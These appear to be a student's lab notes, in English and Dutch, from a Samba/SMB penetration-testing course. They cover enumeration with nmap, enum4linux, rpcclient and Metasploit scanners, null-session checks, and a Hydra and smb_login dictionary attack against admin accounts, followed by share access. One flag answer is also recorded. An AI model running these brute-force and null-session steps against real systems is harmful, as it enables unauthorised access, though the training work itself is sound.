				fr--r--r--       8589934592 Mon May 15 16:49:40 2023	pagefile.sys
				dr--r--r--                0 Wed Aug 12 10:49:32 2020	PerfLogs
				dw--w--w--                0 Wed Aug 12 10:49:32 2020	Program Files
				dr--r--r--                0 Sat Sep  5 14:35:45 2020	Program Files (x86)
				dr--r--r--                0 Sat Sep  5 14:35:45 2020	ProgramData
				dr--r--r--                0 Sat Sep  5 09:16:57 2020	System Volume Information
				dw--w--w--                0 Sat Dec 19 11:14:55 2020	Users
				dr--r--r--                0 Sat Dec 19 11:26:46 2020	Windows
			root@attackdefense:~# smbmap -H 10.2.17.126 -u administrator -p 'smbserver_771' --download 'C$\flag.txt'
			[+] Starting download: C$\flag.txt (32 bytes)
			[+] File output to: /root/10.2.17.126-C_flag.txt
			root@attackdefense:~# ls        
			10.2.17.126-C_flag.txt	Desktop  backdoor  thinclient_drives
			root@attackdefense:~# cat 10.2.17.126-C_flag.txt 




####  SMB: Samba 1 

- run nmap on target 
- run service scan on open port to determine what the services are (standard nmap makes a guess based on the port number but service scan gives definite anwer on the service)
- run udp scan with --top-port 25 --open which mean that the top 25 port will be scanned that are open 
- do service enumeration on open udp ports 
- go back to enumeration on port 445: nmap {target ip} -p 445 --script smb-os-discovery 
- run: **msfconsole** 
	- The `msfconsole` command is used to launch the Metasploit Framework console, which is a command-line interface (CLI) for the Metasploit Framework. The Metasploit Framework is a powerful open-source penetration testing tool used for developing and executing exploit code against target systems.
	- When you run `msfconsole`, it starts the console and provides you with an interactive shell where you can interact with the various modules, exploits, payloads, and auxiliary tools available within the Metasploit Framework. From the console, you can search for and select exploits, configure payloads, set options, run scans, exploit vulnerabilities, and perform various other security testing tasks.
	- Once the `msfconsole` is launched, you will see a command prompt where you can enter commands and interact with the Metasploit Framework.


		*msfconsole*
		- use auxiliary/scanner/smb/smb_version 
				When you execute this command in the Metasploit console (msf5), it sets the context to the specified auxiliary module, which is designed to scan and identify the SMB (Server Message Block) version running on a target system.
		- show options  ![[Pasted image 20230515145301.png]]
		- set rhost {target ip }
		- options (check if options are good)
		- run or exploit ![[Pasted image 20230515145701.png]]
		- exit 



- *nmblookup -h* 
- *nmblookup -A {target IP}* Het nmblookup-commando is een hulpprogramma dat wordt gebruikt om NetBIOS-naamservers te bevragen om informatie te verkrijgen over NetBIOS-namen en hun bijbehorende IP-adressen. Door de optie -A te gebruiken, gevolgd door een doel-IP-adres, voert het commando een omgekeerde zoekopdracht uit om de NetBIOS-naam op te halen die is gekoppeld aan dat IP-adres. Samengevat, het commando nmblookup -A {doel-IP} haalt de NetBIOS-naam op die overeenkomt met het opgegeven doel-IP-adres door de NetBIOS-naamserver te bevragen. ![[Pasted image 20230515150443.png]] 
	   `<20>`: Represents the NetBIOS service type. In this case, `<20>` corresponds to the file-sharing service.
	 `<group>`: Indicates that the NetBIOS name is a group name, rather than an individual computer name.
         `<active>`: Shows that the NetBIOS name is currently active.
         `H`: Denotes that the device supports hybrid mode, which means it can communicate using both NetBIOS and DNS naming systems.
	
- We see <20> that means we can try to connect to this for this we use: smbclient. 
- *smbclient -h*  Help page
- *smbclient -L {targetip} -N*  
	- -   `smbclient`: Dit is de opdracht om een SMB-clientprogramma te starten.
	-   `-L {targetip}`: Deze optie geeft aan dat je een lijst van gedeelde bronnen op een specifiek IP-adres wilt verkrijgen. 
	-   `-N`: Deze optie schakelt de authenticatie uit, waardoor je geen gebruikersnaam en wachtwoord hoeft op te geven om verbinding te maken met de SMB-server. Hierdoor kun je de lijst van gedeelde bronnen verkrijgen zonder authenticatiegegevens.

When you see IPC$ with a null session (A null session refers to an unauthenticated connection or session established between a client and a server without providing any credentials or authentication information.) then you might be able to connect to it 

- rcpclient -h 
- *rpcclient -U "" -N {target ip}*
	- `rpcclient`: Dit is de opdracht om een RPC-clientprogramma te starten
	-   `-U ""`: Deze optie geeft aan dat je een lege gebruikersnaam ("") gebruikt om verbinding te maken. Hiermee wordt een null session geïnitieerd, wat betekent dat er geen expliciete gebruikersnaam wordt verstrekt voor authenticatie.
	-   `-N`: Deze optie schakelt de authenticatie uit, waardoor er geen wachtwoord nodig is om verbinding te maken met de RPC-service.
	-   `{target ip}`: Dit is het IP-adres van de doel-RPC-service waarmee verbinding moet worden gemaakt. Het moet worden vervangen door het werkelijke IP-adres. 



-----

LAB Samba Basics

targetip: 192.179.187.3 

Objective lab -> Questions

1.  Find the default tcp ports used by smbd.
   
		   root@attackdefense:~# nmap 192.179.187.3
			PORT    STATE SERVICE
			139/tcp open  netbios-ssn
			445/tcp open  microsoft-ds   📍
			MAC Address: 02:42:C0:B3:BB:03 (Unknown)
   
   
   
2.  Find the default udp ports used by nmbd.
   
		   root@attackdefense:~# nmap -sU  --top-port 25 --open  192.179.187.3
		Not shown: 23 closed ports
		PORT    STATE         SERVICE
		137/udp open          netbios-ns
		138/udp open|filtered netbios-dgm

   
3.  What is the workgroup name of samba server?
   
		   root@attackdefense:~# nmap -sU -sV  --top-port 25 --open  192.179.187.3
		Not shown: 23 closed ports
		PORT    STATE         SERVICE     VERSION
		137/udp open          netbios-ns  Samba nmbd netbios-ns (workgroup: RECONLABS) 📍
		138/udp open|filtered netbios-dgm
		Service Info: Host: SAMBA-RECON
   
4.  Find the exact version of samba server by using appropriate nmap script.
   
		root@attackdefense:~# nmap -p 445 --script smb-os-discovery 192.179.187.3
		PORT    STATE SERVICE
		445/tcp open  microsoft-ds
		Host script results:
		| smb-os-discovery:                         |
		| ----------------------------------------- |
		| OS: Windows 6.1 (Samba 4.3.11-Ubuntu)     | 📍
		| Computer name: victim-1                   |
		| NetBIOS computer name: SAMBA-RECON\x00    |
		| Domain name: \x00                         |
		| FQDN: victim-1                            |
		| _  System time: 2023-05-15T13:57:22+00:00 | 


5.  Find the exact version of samba server by using smb_version metasploit module.
   
   
		   msf5 auxiliary(scanner/smb/smb_version) > run
		   
			[] 192.179.187.3:445     - Host could not be identified: Windows 6.1 (Samba 4.3.11-Ubuntu)
		[] 192.179.187.3:445     - Scanned 1 of 1 hosts (100% complete)
		[] Auxiliary module execution completed
		
   
   
6.  What is the NetBIOS computer name of samba server? Use appropriate nmap scripts.
![[Pasted image 20230515160842.png]]
![[Pasted image 20230515160851.png]]
root@attackdefense:~# nmap -p 445 --script smb-os-discovery 192.179.187.3
Starting Nmap 7.70 ( https://nmap.org ) at 2023-05-15 13:57 UTC
Nmap scan report for target-1 (192.179.187.3)
Host is up (0.000049s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 02:42:C0:B3:BB:03 (Unknown)

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: victim-1
|   NetBIOS computer name: SAMBA-RECON\x00
|   Domain name: \x00
|   FQDN: victim-1
|_  System time: 2023-05-15T13:57:22+00:00


   
   
7.  Find the NetBIOS computer name of samba server using nmblookup
   
   
   		   
		   
		   root@attackdefense:~# nmblookup -A 192.179.187.3
		Looking up status of 192.179.187.3
		        SAMBA-RECON     <00> -         H <ACTIVE> 
		        SAMBA-RECON     <03> -         H <ACTIVE> 
		        SAMBA-RECON     <20> -         H <ACTIVE>  📍
		        ..__MSBROWSE__. <01> - <GROUP> H <ACTIVE> 
		        RECONLABS       <00> - <GROUP> H <ACTIVE> 
		        RECONLABS       <1d> -         H <ACTIVE> 
		        RECONLABS       <1e> - <GROUP> H <ACTIVE> 
		
		        MAC Address = 00-00-00-00-00-00

   
   
   
   
   
   
   
   
8.  Using smbclient determine whether anonymous connection (null session)  is allowed on the samba server or not.
   
   ✔
   
   
   
   root@attackdefense:~# smbclient -L 192.179.187.3 -N

        Sharename       Type      Comment
        ---------       ----      -------
        public          Disk      
        john            Disk      
        aisha           Disk      
        emma            Disk      
        everyone        Disk      
        IPC$            IPC       IPC Service (samba.recon.lab)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        RECONLABS            SAMBA-RECON
   
   
   
   
   
9.  Using rpcclient determine whether anonymous connection (null session) is allowed on the samba server or not.

✔

![[Pasted image 20230515160600.png]]




Stappenplan: 

-   Voer een nmap-scan uit op het doel: `nmap {targetip}`
-   Voer een servicescan uit op open poorten om te bepalen welke services actief zijn: `nmap -sV {targetip}`
-   Voer een UDP-scan uit op de top 25 open poorten: `nmap -sU --top-ports 25 --open {targetip}`
-   Voer een service-enumeratie uit op de open UDP-poorten: `nmap -sU -sV --top-ports 25 --open {targetip}`
-   Ga terug naar de enumeratie op poort 445 en voer smb-os-discovery-script uit: `nmap -p 445 --script smb-os-discovery {targetip}`
-   Start de Metasploit Framework-console met het commando `msfconsole`
-   Voer de volgende stappen uit in de Metasploit-console:
    1.  Toon de beschikbare opties: `show options`
    2.  Stel het doel-IP in: `set rhost {targetip}`
    3.  Controleer of de opties correct zijn: `options`
    4.  Voer de exploit uit: `run` of `exploit`
    5.  Verlaat de Metasploit-console: `exit`
-   Voer `nmblookup -A {targetip}` uit om de NetBIOS-naam voor het opgegeven doel-IP op te halen.
-   Gebruik smbclient om verbinding te maken met de gevonden service. Voer `smbclient -L {targetip} -N` uit.
-   Gebruik `rpcclient -U "" -N {targetip}` om verbinding te maken met de RPC-service met een null session.


#####  SMB: Samba 2

- Run service scan on open ports to identify samba 
- run: **rpcclient -U "" -N {Target ip}**
			- -   `-U ""`: Specifies an empty username for the connection.
			-   `-N`: Instructs `rpcclient` to use a null session (i.e., without authentication).
			-   `{Target ip}`: Placeholder for the IP address or hostname of the target system
	- run: srvinfo (gives info about OS)  - exit 
- run: **enum4linux** -o {target ip}
	- "enum4linux": Dit is een tool die wordt gebruikt voor het enumereren van informatie over Windows- en Samba-systemen. Het voert verschillende opdrachten uit om informatie op te halen zoals gebruikerslijsten, groepslijsten, sharelijsten en andere details.
	- Het "-o" argument wordt gebruikt om de verzamelde informatie op te slaan in een uitvoerbestand
- run:  **smbclient -L {target IP}** 
- run: **nmap {target} -p 445 --script smb-protocols** 
- run: **msfconsole** 
	- use auxiliary/scanner/smb/smb2 
	- set RHOSTS {target ip} 
	- options 
	- run 
	- write the info you see 
- run a script for enumerating users: **nmap {ip} -p 445 --script smb-enum-users** 
- run: **enum4linux -U {target}**   (enum4linux -h for options) 
- run: **rpcclient -U "" -N {Target ip}** 
	- enumdomusers 
	- lookupnames amin 

--------  LAB ---------- 


Target ip: 192.65.249.3 

Questions

1.  Find the OS version of samba server using rpcclient.
   
	   	root@attackdefense:~# rpcclient -U "" -N 192.65.249.3
			rpcclient $> srvinfo
			        SAMBA-RECON    Wk Sv PrQ Unx NT SNT samba.recon.lab
			        platform_id     :       500
			        os version      :       6.1  📍
			        server type     :       0x809a03 
   
   
2.  Find the OS version of samba server using enum4Linux.
   
		root@attackdefense:~# enum4linux -o 192.65.249.3
		Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue May 16 06:37:54 2023
		
		 ========================== 
		|    Target Information    |
		 ========================== 
		Target ........... 192.65.249.3
		RID Range ........ 500-550,1000-1050
		Username ......... ''
		Password ......... ''
		Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
		
		
		 ==================================================== 
		|    Enumerating Workgroup/Domain on 192.65.249.3    |
		 ==================================================== 
		[+] Got domain/workgroup name: RECONLABS
		
		 ===================================== 
		|    Session Check on 192.65.249.3    |
		 ===================================== 
		[+] Server 192.65.249.3 allows sessions using username '', password ''

		
		 ====================================== 
		|    OS information on 192.65.249.3    |
		 ====================================== 
		Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
		[+] Got OS info for 192.65.249.3 from smbclient: 
		[+] Got OS info for 192.65.249.3 from srvinfo:
		        SAMBA-RECON    Wk Sv PrQ Unx NT SNT samba.recon.lab
		        platform_id     :       500
		        os version      :       6.1 📍
		        server type     :       0x809a03
		enum4linux complete on Tue May 16 06:37:54 2023
   
   
3.  Find the server description of samba server using smbclient.
   
		   root@attackdefense:~# smbclient -L 192.65.249.3
		Enter WORKGROUP\GUEST's password: 
		
		        Sharename       Type      Comment
		        ---------       ----      -------
		        public          Disk      
		        john            Disk      
		        aisha           Disk      
		        emma            Disk      
		        everyone        Disk      
		        IPC$            IPC       IPC Service (samba.recon.lab)
		Reconnecting with SMB1 for workgroup listing.
		
		        Server               Comment
		        ---------            -------
		
		        Workgroup            Master
		        ---------            -------
		        RECONLABS            SAMBA-RECON
   
   
4.  Is NTLM 0.12 (SMBv1) dialects supported by the samba server? Use appropriate nmap script.
   
		   root@attackdefense:~# nmap 192.65.249.3 -p 445 --script smb-protocols
		PORT    STATE SERVICE
		445/tcp open  microsoft-ds
		MAC Address: 02:42:C0:41:F9:03 (Unknown)
		
		Host script results:
		| smb-protocols: 
		|   dialects: 
		|     NT LM 0.12 (SMBv1) [dangerous, but default] 📍
		|     2.02
		|     2.10
		|     3.00
		|     3.02
		|_    3.11

   
   
   
5.  Is SMB2 protocol supported by the samba server? Use smb2 metasploit module.
   
   
		   msf5 auxiliary(scanner/smb/smb2) > run
		
		[+] 192.65.249.3:445      - 192.65.249.3 supports SMB 2 [dialect 255.2] and has been 📍online for 3702414 hours
		[*] 192.65.249.3:445      - Scanned 1 of 1 hosts (100% complete)
		[*] Auxiliary module execution completed
		   
		   
   
6.  List all users that exists on the samba server  using appropriate nmap script.
   
		   root@attackdefense:~# nmap 192.65.249.3 -p 445 --script smb-enum-users
		Starting Nmap 7.70 ( https://nmap.org ) at 2023-05-16 06:53 UTC
		Nmap scan report for target-1 (192.65.249.3)
		Host is up (0.000051s latency).
		
		PORT    STATE SERVICE
		445/tcp open  microsoft-ds
		MAC Address: 02:42:C0:41:F9:03 (Unknown)
		
		Host script results:
		| smb-enum-users: 
		|   SAMBA-RECON\admin (RID: 1005)
		|     Full name:   
		|     Description: 
		|     Flags:       Normal user account
		|   SAMBA-RECON\aisha (RID: 1004)
		|     Full name:   
		|     Description: 
		|     Flags:       Normal user account
		|   SAMBA-RECON\elie (RID: 1002)
		|     Full name:   
		|     Description: 
		|     Flags:       Normal user account
		|   SAMBA-RECON\emma (RID: 1003)
		|     Full name:   
		|     Description: 
		|     Flags:       Normal user account
		|   SAMBA-RECON\john (RID: 1000)
		|     Full name:   
		|     Description: 
		|     Flags:       Normal user account
		|   SAMBA-RECON\shawn (RID: 1001)
		|     Full name:   
		|     Description: 
		|_    Flags:       Normal user account
   

   
7.  List all users that exists on the samba server  using smb_enumusers metasploit modules.
   
      
		  msf5 auxiliary(scanner/smb/smb_enumusers) > run
		
		[+] 192.65.249.3:139      - SAMBA-RECON [ john, elie, aisha, shawn, emma, admin ] ( LockoutTries=0 PasswordMin=5 )
		[*] 192.65.249.3:         - Scanned 1 of 1 hosts (100% complete)
		[*] Auxiliary module execution completed
		   
   
   
   
   
   
8.  List all users that exists on the samba server using enum4Linux.
   
		   root@attackdefense:~# enum4linux -U 192.65.249.3
		Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue May 16 06:55:13 2023
		
		 ========================== 
		|    Target Information    |
		 ========================== 
		Target ........... 192.65.249.3
		RID Range ........ 500-550,1000-1050
		Username ......... ''
		Password ......... ''
		Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
		
		
		 ==================================================== 
		|    Enumerating Workgroup/Domain on 192.65.249.3    |
		 ==================================================== 
		[+] Got domain/workgroup name: RECONLABS
		
		 ===================================== 
		|    Session Check on 192.65.249.3    |
		 ===================================== 
		[+] Server 192.65.249.3 allows sessions using username '', password ''
		
		 =========================================== 
		|    Getting domain SID for 192.65.249.3    |
		 =========================================== 
		Domain Name: RECONLABS
		Domain Sid: (NULL SID)
		[+] Can't determine if host is part of domain or part of a workgroup
		
		 ============================= 
		|    Users on 192.65.249.3    |
		 ============================= 
		index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: john     Name:   Desc: 
		index: 0x2 RID: 0x3ea acb: 0x00000010 Account: elie     Name:   Desc: 
		index: 0x3 RID: 0x3ec acb: 0x00000010 Account: aisha    Name:   Desc: 
		index: 0x4 RID: 0x3e9 acb: 0x00000010 Account: shawn    Name:   Desc: 
		index: 0x5 RID: 0x3eb acb: 0x00000010 Account: emma     Name:   Desc: 
		index: 0x6 RID: 0x3ed acb: 0x00000010 Account: admin    Name:   Desc: 
		
		user:[john] rid:[0x3e8]
		user:[elie] rid:[0x3ea]
		user:[aisha] rid:[0x3ec]
		user:[shawn] rid:[0x3e9]
		user:[emma] rid:[0x3eb]
		user:[admin] rid:[0x3ed]
		enum4linux complete on Tue May 16 06:55:13 2023
   

   
9.  List all users that exists on the samba server  using rpcclient.
  
		root@attackdefense:~# rpcclient -U "" -N 192.65.249.3
		rpcclient $> enumdomusers
		user:[john] rid:[0x3e8]
		user:[elie] rid:[0x3ea]
		user:[aisha] rid:[0x3ec]
		user:[shawn] rid:[0x3e9]
		user:[emma] rid:[0x3eb]
		user:[admin] rid:[0x3ed]


   
10.  Find SID of user “admin” using rpcclient.

	rpcclient $> lookupnames admin
	admin S-1-5-21-4056189605-2085045094-1961111545-1005 (User: 1)




-----

#### SMB 3 

- run to show shares: **nmap {target ip} -p 445 --script smb-enum-shares** 
- run msfconsole: **use auxiliary/scanner/smb/smb_enumshares** 
	- set rhosts 
	- show options (make sure that everything with a yes is filled in)
	- exploit 
	- exit 
- run: **enum4linux -S {ip}** 
- run: **smbclient -L {target} -N**   (-N = nullsession)
- run: **enum4linux -G {target}** 
- run: **rpcclient -U "" -N {target}** 
	- enumdomgroups
- run: smbclient //target/Public -N 
	- when you are in: hulp 
	- ls en cd 


-- LAB --- 

**target ip: 192.125.191.3**  

Questions

1.  List all available shares on the samba server using Nmap script.
   
		 root@attackdefense:~# nmap 192.125.191.3 -p 445 --script smb-enum-shares
				Starting Nmap 7.70 ( https://nmap.org ) at 2023-05-16 07:35 UTC
				Nmap scan report for target-1 (192.125.191.3)
				Host is up (0.000076s latency).
		
		PORT    STATE SERVICE
		445/tcp open  microsoft-ds
		MAC Address: 02:42:C0:7D:BF:03 (Unknown)
		
		Host script results:
		| smb-enum-shares: 
		|   account_used: guest
		|   \\192.125.191.3\IPC$: 
		|     Type: STYPE_IPC_HIDDEN
		|     Comment: IPC Service (samba.recon.lab)
		|     Users: 1
		|     Max Users: <unlimited>
		|     Path: C:\tmp
		|     Anonymous access: READ/WRITE
		|     Current user access: READ/WRITE
		|   \\192.125.191.3\aisha: 
		|     Type: STYPE_DISKTREE
		|     Comment: 
		|     Users: 0
		|     Max Users: <unlimited>
		|     Path: C:\samba\aisha
		|     Anonymous access: <none>
		|     Current user access: <none>
		|   \\192.125.191.3\emma: 
		|     Type: STYPE_DISKTREE
		|     Comment: 
		|     Users: 0
		|     Max Users: <unlimited>
		|     Path: C:\samba\emma
		|     Anonymous access: <none>
		|     Current user access: <none>
		|   \\192.125.191.3\everyone: 
		|     Type: STYPE_DISKTREE
		|     Comment: 
		|     Users: 0
		|     Max Users: <unlimited>
		|     Path: C:\samba\everyone
		|     Anonymous access: <none>
		|     Current user access: <none>
		|   \\192.125.191.3\john: 
		|     Type: STYPE_DISKTREE
		|     Comment: 
		|     Users: 0
		|     Max Users: <unlimited>
		|     Path: C:\samba\john
		|     Anonymous access: <none>
		|     Current user access: <none>
		|   \\192.125.191.3\public: 
		|     Type: STYPE_DISKTREE
		|     Comment: 
		|     Users: 0
		|     Max Users: <unlimited>
		|     Path: C:\samba\public
		|     Anonymous access: READ/WRITE
		|_    Current user access: READ/WRITE
   
   
   
   
   
2.  List all available shares on the samba server using smb_enumshares Metasploit module.

		     msf5 auxiliary(scanner/smb/smb_enumshares) > exploit
		
		[+] 192.125.191.3:445     - public - (DS) 
		[+] 192.125.191.3:445     - john - (DS) 
		[+] 192.125.191.3:445     - aisha - (DS) 
		[+] 192.125.191.3:445     - emma - (DS) 
		[+] 192.125.191.3:445     - everyone - (DS) 
		[+] 192.125.191.3:445     - IPC$ - (I) IPC Service (samba.recon.lab)
		[*] 192.125.191.3:        - Scanned 1 of 1 hosts (100% complete)
		[*] Auxiliary module execution completed



   
3.  List all available shares on the samba server using enum4Linux.
   
		   
		root@attackdefense:~# enum4linux -S 192.125.191.3 
		Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue May 16 07:40:24 2023
		
		 ========================== 
		|    Target Information    |
		 ========================== 
		Target ........... 192.125.191.3
		RID Range ........ 500-550,1000-1050
		Username ......... ''
		Password ......... ''
		Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
		
		
		 ===================================================== 
		|    Enumerating Workgroup/Domain on 192.125.191.3    |
		 ===================================================== 
		[+] Got domain/workgroup name: RECONLABS
		
		 ====================================== 
		|    Session Check on 192.125.191.3    |
		 ====================================== 
		[+] Server 192.125.191.3 allows sessions using username '', password ''
		
		 ============================================ 
		|    Getting domain SID for 192.125.191.3    |
		 ============================================ 
		Domain Name: RECONLABS
		Domain Sid: (NULL SID)
		[+] Can't determine if host is part of domain or part of a workgroup
		
		 ========================================== 
		|    Share Enumeration on 192.125.191.3    |
		 ========================================== 
		
		        Sharename       Type      Comment
		        ---------       ----      -------
		        public          Disk      
		        john            Disk      
		        aisha           Disk      
		        emma            Disk      
		        everyone        Disk      
		        IPC$            IPC       IPC Service (samba.recon.lab)
		Reconnecting with SMB1 for workgroup listing.
		
		        Server               Comment
		        ---------            -------
		
		        Workgroup            Master
		        ---------            -------
		        RECONLABS            SAMBA-RECON
		
		[+] Attempting to map shares on 192.125.191.3
		//192.125.191.3/public  Mapping: OK, Listing: OK
		//192.125.191.3/john    Mapping: DENIED, Listing: N/A
		//192.125.191.3/aisha   Mapping: DENIED, Listing: N/A
		//192.125.191.3/emma    Mapping: DENIED, Listing: N/A
		//192.125.191.3/everyone        Mapping: DENIED, Listing: N/A
		//192.125.191.3/IPC$    [E] Can't understand response:
		NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
		enum4linux complete on Tue May 16 07:40:24 2023
   
   
   
   
4.  List all available shares on the samba server using smbclient.
   
		   root@attackdefense:~# smbclient -L 192.125.191.3 -N
		
		        Sharename       Type      Comment
		        ---------       ----      -------
		        public          Disk      
		        john            Disk      
		        aisha           Disk      
		        emma            Disk      
		        everyone        Disk      
		        IPC$            IPC       IPC Service (samba.recon.lab)
		Reconnecting with SMB1 for workgroup listing.
		
		        Server               Comment
		        ---------            -------
		
		        Workgroup            Master
		        ---------            -------
		        RECONLABS            SAMBA-RECON
   
   
   
5.  Find domain groups that exist on the samba server by using enum4Linux.
	   
		   root@attackdefense:~# enum4linux -G 192.125.191.3
		Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue May 16 07:58:24 2023
		
		 ========================== 
		|    Target Information    |
		 ========================== 
		Target ........... 192.125.191.3
		RID Range ........ 500-550,1000-1050
		Username ......... ''
		Password ......... ''
		Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
	
		
		 ===================================================== 
		|    Enumerating Workgroup/Domain on 192.125.191.3    |
		 ===================================================== 
		[+] Got domain/workgroup name: RECONLABS 📍
		
		 ====================================== 
		|    Session Check on 192.125.191.3    |
		 ====================================== 
		[+] Server 192.125.191.3 allows sessions using username '', password ''
		
		 ============================================ 
		|    Getting domain SID for 192.125.191.3    |
		 ============================================ 
		Domain Name: RECONLABS
		Domain Sid: (NULL SID)
		[+] Can't determine if host is part of domain or part of a workgroup
		
		 =============================== 
		|    Groups on 192.125.191.3    |
		 =============================== 
		
		[+] Getting builtin groups:
		
		[+] Getting builtin group memberships:
		
		[+] Getting local groups:
		group:[Testing] rid:[0x3f0]
		
		[+] Getting local group memberships:
		
		[+] Getting domain groups:
		group:[Maintainer] rid:[0x3ee] 📍
		group:[Reserved] rid:[0x3ef] 📍
		
		[+] Getting domain group memberships:
		enum4linux complete on Tue May 16 07:58:24 2023
	

   
   
6.  Find domain groups that exist on the samba server by using rpcclient.
   
   
		   root@attackdefense:~# rpcclient -U "" -N 192.125.191.3
		rpcclient $> enumdomgroups
		group:[Maintainer] rid:[0x3ee]
		group:[Reserved] rid:[0x3ef]
   
   
   
   
   
   
7.  Is samba server configured for printing?
   
   
run: enum4linux -i {targetip} 
   
   
   
   
   
8.  How many directories are present inside share “public”?
   
		   root@attackdefense:~# smbclient //192.125.191.3/Public -N
		Try "help" to get a list of possible commands.
		smb: \> ls
		  .                                   D        0  Tue May 16 07:35:39 2023
		  ..                                  D        0  Tue Nov 27 13:36:13 2018
		  dev                                 D        0  Tue Nov 27 13:36:13 2018
		  secret                              D        0  Tue Nov 27 13:36:13 2018

   
   
   
9.  Fetch the flag from samba server. 

03ddb97933e716f5057a18632badb3b4 


use more to read content and q to get out of 
![[Pasted image 20230516101232.png]]


#### SMB Dictonary Attack 
- wordlist = list of passwords e.g. rocky 
- Enumerate smb share: 
	- run: msfconsole 
	- use auxiliary/scanner/smb/smb_login 
	- info (uitleg van module)
	- options 
	- set rhosts {target} 
	- set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt 
	- set smbuser {jane}
	- options 
	- run 
	- exit 
- run this commmand first: *gzip -d /usr/share/wordlists/rockyou.txt.gz* 
		Specifiek wordt hier het bestand "rockyou.txt.gz" uitgepakt, dat zich bevindt in de map "/usr/share/wordlists/". Na uitvoering van dit commando zal het zip bestand "rockyou.txt.gz" worden uitgepakt en zal het resulterende ongecomprimeerde bestand "rockyou.txt" in dezelfde map worden geplaatst. Het ".gz" -extensie geeft aan dat het bestand gecomprimeerd is met gzip-compressie 
- run: *hydra -l admin -P /usr/share/wordlists/rockyou.txt.gz  {target} smb*
			- de tool Hydra wordt gebruikt om een aanval uit te voeren op een inlogpagina met behulp van een lijst met wachtwoorden.
			-  "-l admin" geeft aan dat de gebruikersnaam die wordt gebruikt tijdens de aanval "admin" is. Dit kan worden gewijzigd naar de gewenste gebruikersnaam. De vlag '-l' wordt gebruikt om de gebruikersnaam op te geven die wordt gebruikt tijdens het uitvoeren van een aanval. 
			-  -P /usr/share/wordlists/rockyou.txt.gz" geeft de locatie aan van het wachtwoordenbestand dat zal worden gebruikt tijdens de aanval. In dit geval wordt het bestand "rockyou.txt.gz" gebruikt, dat zich bevindt in de map "/usr/share/wordlists/". Dit bestand bevat een lijst met mogelijke wachtwoorden die worden uitgepakt door het commando. De vlag '-P' wordt gebruikt om het wachtwoordenbestand op te geven dat wordt gebruikt tijdens het uitvoeren van de aanval. 
- run: *smbmap -H {target} -u admin -p password1* 
- find out of any of the share are browsable: ***smbclient -L {target} -U jane  (password is 123abc)***
- run: **smbclient //target/jane -U jane** 
- ls 
- run: **smbclient //target/admin -U admin** 
![[Pasted image 20230516103627.png]]
- first get file then **exit smb > ls > use tar -xf flag.tar.gz** 
	- Het commando "tar -xf flag.tar.gz" wordt gebruikt om een gecomprimeerd archiefbestand met de extensie ".tar.gz" uit te pakken met behulp van het programma 'tar'. 
	- -   "tar" is het opdrachtregelhulpprogramma dat wordt gebruikt voor het beheren van archiefbestanden.
	-  "-xf" zijn de opties voor 'tar':
	    -   De optie 'x' staat voor extract, wat betekent dat we het archief willen uitpakken.
	    -   De optie 'f' gevolgd door het bestandsnaamargument "flag.tar.gz" geeft aan dat we het specifieke archiefbestand willen uitpakken.
- enumerate pipes: 
	- msfconsole 
	- **use auxiliary/scanner/smb/pipe_auditor** 
		- The "msfconsole: auxiliary/scanner/smb/pipe_auditor" module in Metasploit is used for auditing named pipes on remote systems accessible via the Server Message Block (SMB) protocol. It attempts to discover vulnerable or misconfigured named pipes that can be exploited for unauthorized access or information disclosure. 
		- pipeline auditing refers to the process of examining and evaluating the security and configuration of named pipes in a system or network. Named pipes are a form of interprocess communication (IPC) mechanism that allows communication between different processes or applications on a system.
		  
	- set smbuser admin 
	- set smbpass password1 
	- set rhost target 
	- options 
	- run 
- Get a list of SID: **enum4linux -r -u "admin" -p "password1" {target}** 
	-   "-r": This option tells enum4linux to perform a recursive enumeration, which means it will explore all possible shares and domains.
	-   "-u 'admin'": This option specifies the username to be used for authentication.
	-   "-p 'password1'": This option specifies the password to be used for authentication.


---- stappenplan 

1.  Enumerate SMB shares:
    
    -   Open a terminal and run: `msfconsole`
    -   Inside the Metasploit console, run: `use auxiliary/scanner/smb/smb_login`
    -   Set the target host with: `set rhosts {target}`
    -   Set the password file with: `set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt`
    -   Set the SMB username with: `set smbuser {jane}`
    -   Run: `options` to confirm the settings
2.  Decompress the wordlist:
    -   Run: `gzip -d /usr/share/wordlists/rockyou.txt.gz`
3.  Perform a password attack using Hydra:
    -   Run: `hydra -l admin -P /usr/share/wordlists/rockyou.txt {target} smb`
4.  Check if any shares are browsable:
    -   Run: `smbclient -L {target} -U jane -p 123abc`
5.  Explore the 'jane' share:
    -   Run: `smbclient //target/jane -U jane`
    -   Run: `ls` to list the files in the share
6.  Explore the 'admin' share:
    -   Run: `smbclient //target/admin -U admin`
    -   After authenticating, the prompt will change to `smb: \>`
    -   Run: `ls` to list the files in the share
7.  Extract a compressed file:
    -   Get the desired file using `smbclient`
    -   Exit the `smbclient` prompt
    -   Run: `ls` to verify the file is present
    -   Run: `tar -xf flag.tar.gz` to extract the compressed archive
8.  Enumerate named pipes:
    -   Open a terminal and run: `msfconsole`
    -   Inside the Metasploit console, run: `use auxiliary/scanner/smb/pipe_auditor`
    -   Set the SMB username with: `set smbuser admin`
    -   Set the SMB password with: `set smbpass password1`
    -   Set the target host with: `set rhost {target}`
    -   Run: `options` to view and verify the options
    -   Finally, run the module with: `run`
9.  Get a list of SIDs:
    -   Run: `enum4linux -r -u "admin" -p "password1" {target}`

---- LAB ---- 


**target ip: 192.57.201.3** 

